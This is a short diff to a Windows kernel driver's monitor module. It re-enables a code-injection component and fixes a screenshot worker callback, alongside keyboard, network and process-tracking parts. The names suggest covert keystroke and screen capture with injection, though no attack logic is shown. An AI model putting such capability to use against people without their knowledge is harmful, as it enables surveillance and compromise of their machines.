@@ -233,13 +233,11 @@ NTSTATUS
 		goto start_failed;
 	}
 
-	/*
 	Status = InjectStart(&Monitor->Inject);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "InjectStart failed err=%x", Status);
 		goto start_failed;
 	}
-	*/
 
 	Status = KbdStart(&Monitor->Kbd);
 	if (!NT_SUCCESS(Status)) {
@@ -305,9 +303,9 @@ MonitorStopInternal(PMONITOR Monitor, PKMON_RELEASE ReleaseData)
 	}
 	
 	KbdStop(&Monitor->Kbd);
-	/*
+
 	InjectStop(&Monitor->Inject);
-	*/
+
 	SysWorkerStop(&Monitor->RequestWorker);
 	SysWorkerStop(&Monitor->NetWorker);
 	ProcessTableStop(&Monitor->ProcessTable);
@@ -368,7 +366,7 @@ VOID
 
 NTSTATUS MonitorOpenWinstaWorker(POPEN_WINSTA OpenWinsta)
 {
-	WCHAR FullObjName[0x100];
+	WCHAR FullObjName[KMON_MAX_CHARS];
 	NTSTATUS Status;
 	OBJECT_ATTRIBUTES ObjectAttributes;
 	UNICODE_STRING usFullObjName;
@@ -645,7 +643,7 @@ MonitorScreenshot(PKMON_SCREENSHOT ScreenShot)
 	ScreenShot->Process = PsGetCurrentProcess();
 	ObReferenceObject(ScreenShot->Process);
 
-	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenWinstaWorker, ScreenShot);
+	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorScreenshotWorker, ScreenShot);
 	if (WrkItem == NULL) {
 		KLog(LError, "Cant queue wrk item");
 		Status = STATUS_UNSUCCESSFUL;
